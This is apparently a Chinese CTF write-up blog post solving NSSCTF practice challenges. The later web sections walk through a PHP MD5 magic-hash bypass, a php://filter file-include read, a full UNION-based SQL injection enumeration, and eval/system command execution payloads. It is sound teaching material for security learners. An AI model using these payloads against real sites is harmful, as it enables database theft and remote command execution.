---
title: 乱七八糟的WP
date: 2026-05-15
draft:
lastmod: 2026-05-28
featured: true
tags:
  - CTF
  - WP
cover: images/4.jpg
---
# `Misc`
## [[SEETF 2023]1337 Word Search - NSSCTF](https://www.nssctf.cn/problem/4207)

### 思路
- 先看题目描述：**这是一个大型的字谜游戏。在网格中找到隐藏的`flag`，可以在八个方向中的任何一个方向（水平、垂直或对角线）找到。**——可以猜测是一道单词搜索题
- 再看附件：文件解压后看见一大堆乱字符，于是我们看：
	- 有没有图片？——没有，所以不是图片隐写
	- 有没有压缩包？——没有，所以不是压缩密码
	- 是不是编码？不像，因为没有规律且有`{}`与`_`，不像`base64`
	- 同时也结合题目强调的`grid`（网格），说明：这些字符不是一整串，而应该按照二维矩阵理解
- 而`flag`格式给了：
```text
SEE{}
```
- 所以核心思路就是：
	1. 把整个文本按照“矩阵”处理
	2. 从所有 `S` 开始搜索
	3. 朝 8 个方向尝试读取字符串
	4. 找到完整 `SEE{...}`

### `EXP`
```python
dirs = [
    (0,1),   # →
    (0,-1),  # ←
    (1,0),   # ↓
    (-1,0),  # ↑
    (1,1),   # ↘
    (-1,-1), # ↖
    (1,-1),  # ↙
    (-1,1)   # ↗
]

with open("wordsearch1.txt","r",encoding="utf-8") as f:
    grid = [line.strip() for line in f if line.strip()]

n = len(grid)
m = len(grid[0])

for i in range(n):
    for j in range(m):

        if grid[i][j] != 'S':
            continue

        for dx,dy in dirs:

            s = ""
            x,y = i,j

            for _ in range(100):

                if not (0 <= x < n and 0 <= y < m):
                    break

                s += grid[x][y]

                if s.startswith("SEE{") and s.endswith("}"):
                    print(s)

                x += dx
                y += dy
```
运行脚本后得到`flag`
```text
SEE{you_found_me_now_try_the_1337er_one}
```

---

# `Web`
## [[LitCTF 2023]我Flag呢？ - NSSCTF](https://www.nssctf.cn/problem/3861)

### 前置知识
- 为什么要做元素审查？
	- 因为网页显示出来的内容 不等于 网页的真实内容
- 元素审查看什么
	- | 内容         | 作用            |
| ---------- | ------------- |
| HTML       | 页面结构、隐藏内容     |
| CSS        | 隐藏元素、图片路径     |
| JavaScript | 密码、逻辑、接口      |
| Network 请求 | API、参数、Cookie |
| Storage    | Token、Session |
| Cookie     | 身份验证          |
| Source     | 前端源码          |
- [有关工具列表 - Microsoft Edge Developer documentation | Microsoft Learn](https://learn.microsoft.com/zh-cn/microsoft-edge/devtools/about-tools)

### 思路
- 打开网站发现没有可交互的点，于是`F12`控制台审查元素
- 打开控制台后看到： ![](../img-007.png)
	> **控制台（Console）** 会输出页面资源报错信息/`js`的执行信息，同时也可以在这个交互式终端中执行`js`指令
- 彩蛋提示运行`giveMeEgg()`函数即可拿到彩蛋，所以：  ![](../img-002.png)
- 但提交后发现不对😭,`CTRL+U`查看源码，`CTRL+F`进行搜索`flag`，在最下面的注释找到`flag`

---

## [[LitCTF 2023]导弹迷踪 - NSSCTF](https://www.nssctf.cn/problem/3863)
### 思路
- 这是一个小游戏，而针对这种逻辑是基于`js`的页面游戏，要么采用按照题目要求玩到第六关得到`flag`，要么就修改或者查看源码寻找`flag`
- `F12`查看源码，在搜索框搜索`"level"`，找到`flag`  ![](../img-003.png)

---

## [[LitCTF 2023]就当无事发生 - NSSCTF](https://www.nssctf.cn/problem/3862)
### 思路
- 题目提示：“差点数据没脱敏就发出去了”，同时结合博客网址于是去`Github`上搜索`ProbiusOfficial`
- 出现两条结果，查看后博客的源码应该在第二个  ![](../img-008.png)
- 进入仓库后找到`Commits`（提交记录），因为在题目的版本数据中找到题目的上传时间为`2023-05-02`，于是将仓库的查询时间改为`5`月`2`日之前。  ![](../img-004.png)![](../img-005.png)
- 从查询结果我们发现，`4`月`29`日有两个提交记录，点进后一个提交记录可以看见修改  ![](../img-009.png)

---

## [[LitCTF 2023]Follow me and hack me - NSSCTF](https://www.nssctf.cn/problem/3864)
### 思路
- 使用`HackBar`插件来在浏览器里面进行发送/接收`http`报文  ![](../img-006.png)

---

## [[SWPUCTF 2021 新生赛]easy_md5 - NSSCTF](https://www.nssctf.cn/problem/386)
### 思路
1. 看代码
```php
 if ($name != $password && md5($name) == md5($password)) {
        echo $flag;
} else {
        echo "wrong!";
}
```
这段代码的要求：
> `name`与`password`不能一样，但二者的`md5`结果要相等
但这时我们注意到`PHP`用的是弱比较而不是严格比较

2. 利用`magic hash`
`PHP`里如果长这样：
```txt
0e123456789
```
会被当成科学计数法：
```txt
0 * 10^123456789 = 0
```
所以在`PHP`弱比较里：
```PHP
"0e12345" == "0e67890"
```
的结果为`true`

而有一些字符串的 md5 值刚好是 `0e` 开头，而且后面全是数字，这种就叫 `magic hash`。常见的一组是：
```txt
QNKCDZO -> 0e830400451993494058024219903391
240610708 -> 0e462097431906509019562988736854
```
![](../img-001.png)
得到`flag`
```txt
NSSCTF{6ee63399-6c66-42f3-9216-2980f9982e38}
```

常见 `MD5 magic hash`

|原文|MD5|
|---|---|
|`QNKCDZO`|`0e830400451993494058024219903391`|
|`240610708`|`0e462097431906509019562988736854`|
|`s878926199a`|`0e545993274517709034328855841020`|
|`s155964671a`|`0e342768416822451524974117254469`|
|`s214587387a`|`0e848240448830537924465865611904`|
|`s1091221200a`|`0e940624217856561557816327384675`|

---

## [[SWPUCTF 2021 新生赛]include - NSSCTF](https://www.nssctf.cn/problem/427)
### 思路
1. 打开环境提示“传入一个`file`试试”，所以试着`/?file=flag`，然后得到源码
```PHP
<?php
ini_set("allow_url_include","on");
header("Content-type: text/html; charset=utf-8");
error_reporting(0);
$file=$_GET['file'];
if(isset($file)){
    show_source(__FILE__);
    echo 'flag 在flag.php';
}else{
    echo "传入一个file试试";
}
echo "</br>";
echo "</br>";
echo "</br>";
echo "</br>";
echo "</br>";
include_once($file);
?>
```
接着又尝试`/?file=flag.php`，页面并没有变化

2. 在源码的最后一行看到：
```PHP
include_once($file);
```
有`include_once`函数，即它会执行`flag.php`但并不会显示出来`flag`

>`include_once` 表示在脚本执行期间包含并运行指定文件。此行为和 [include](https://www.php.net/manual/zh/function.include.php) 类似，唯一区别是如果该文件中已经被包含过，则不会再次包含，且 `include_once` 会返回 `true`。顾名思义，`require_once`，文件仅仅包含（require）一次。

3. 所以要用`php://filter`将`flag.php`读取出来
```php
?file=php://filter/read=convert.base64-encode/resource=flag.php
```
意思是：
```txt
使用 PHP 的 filter 伪协议，
在读取 flag.php 的时候，
把 flag.php 的内容进行 Base64 编码，然后输出编码后的结果。
```
得到的`Base64`再转换成`flag`

---

## [[SWPUCTF 2021 新生赛]easy_sql - NSSCTF](https://www.nssctf.cn/problem/387)
### 思路
1‍⃣ **传参**
打开环境，结合“球球你输入点东西吧！”与标签页的“参数是`wllm`”，于是输入：
```txt
?/wllm=1
```
![](../img-010.png)

2‍⃣ **判断字段数：`order by`**
```txt
/?wllm=1' order by 1 --+
/?wllm=1' order by 2 --+
/?wllm=1' order by 3 --+
/?wllm=1' order by 4 --+
```
当`order by 4`时，产生报错，说明字段数是`3`
![](../img-011.png)

3‍⃣ **查看回显点：`union select 1,2,3`**
>回显点：
>`union select 1,2,3 里面，哪个数字会显示在网页上`
```txt
/?wllm=-1' union select 1,2,3 -- '
```
![](../img-012.png)
所以要想查询数据库名就可以把`database()`放到第二位或者第三位
```txt
?/wllm=-1' union select 1,database(),3 --+
?/wllm=-1' union select 1,2,database() --+
```

**为什么用`-1`?**
- 因为用`?wllm=1`可能会查到正常数据
- 用`?wllm=-1`是为了先让网站原本的数据消失，再让它显示我们想查的数据

4‍⃣ **查询数据库信息：`@@version`**
```txt
/?wllm=-1' union select 1,2,@@version -- '
/?wllm=-1' union select 1,@@version,3 -- '
```
![](../img-013.png)![](../img-014.png)
>`@@version`：是`MySQL / MariaDB`里的系统变量，用来显示数据库版本
>这一步的作用：确认数据库类型和版本
如果是`MySQL/MariaDB`，就可以使用
```txt
information_schema
database()
user()
group_concat()
```

| 名称                           | 作用       | 一般什么时候用         |
| ---------------------------- | -------- | --------------- |
| `database()`                 | 查当前数据库名 | 早期，确定当前库        |
| `user()`                     | 查当前数据库用户 | 可选，了解权限         |
| `information_schema.tables`  | 查表名     | 知道数据库后          |
| `information_schema.columns` | 查列名     | 知道表名后          |
| `group_concat()`             | 多行合并成一行 | 查表名、列名、flag 时常用 |

5‍⃣**查询库名和用户名：`database()、user()`**
因为上一步已经确定为`MariaDB`，所以先使用`database()`查询当前数据库名
```txt
/?wllm=-1' union select 1,2,database() -- '
```
![](../img-015.png)
得到当前数据库名为：`test_db`——说明当前网站的数据在`text_db`中。又使用：
```txt
/?wllm=-1' union select 1,2,user() -- '
```
查到当前用户是：`root@localhost`——说明数据库的连接用户是`root`

6‍⃣ **爆表：查询有哪些表**
```txt
/?wllm=-1' union select 1,2,group_concat(table_name) from information_schema.tables where table_schema='test_db'-- '
```
![](../img-016.png)
查出有两个表且将二者合并到一行显示：`test_tb,users`

>`group_concat(table_name)`：把多个表名合并到一行显示
>`table_name`：专门用来存放表名的目录
>`information_schema`：记录了数据库的结构信息——有哪些数据库，每个数据库有哪些表，每个表有哪些列
>`select table_name from information_schema.tables`：查出所有表的名字

7‍⃣ **爆列：查询表里有哪些字段**
```txt
/?wllm=-1' union select 1,2,group_concat(column_name) from information_schema.columns where table_name='test_tb' -- '
```
![](../img-017.png)说明`flag`很可能就在`test_tb`表里

8‍⃣**查`flag`**
```txt
/?wllm=-1' union select 1,2,group_concat(flag) from test_tb -- '
```
![](../img-018.png)

9‍⃣**总结**
```txt
1. 看源码，找到参数 wllm
2. 用 order by 判断字段数
3. 用 union select 1,2,3 找回显位
4. 用 @@version 判断数据库类型
5. 用 database() 查当前数据库
6. 用 information_schema.tables 查表名
7. 用 information_schema.columns 查列名
8. 用 group_concat(flag) from test_tb 查 flag
```

---

## [[SWPUCTF 2021 新生赛]easyrce - NSSCTF](https://www.nssctf.cn/problem/424)
### 思路
1‍⃣ **`eval()`是什么？**
`eval()` 是 `PHP` 里的一个函数，作用是：**把字符串当成 `PHP` 代码执行。**
但是：`eval()`不能直接执行`Linux`命令

而要想执行`Linux`命令，需要调用`system()`函数

2‍⃣判断参数
环境打开后很容易看出要传参`/?url=`；

3‍⃣**查看根目录**
```PHP
?url=system("ls /");
```
查看服务器根目录下有什么文件
![](../img-019.png)
其中，`flllllaaaaaaggggggg`很可疑

4‍⃣ **读取`flag`文件**
```PHP
?url=system("cat /flllllaaaaaaggggggg");
```
![](../img-020.png)
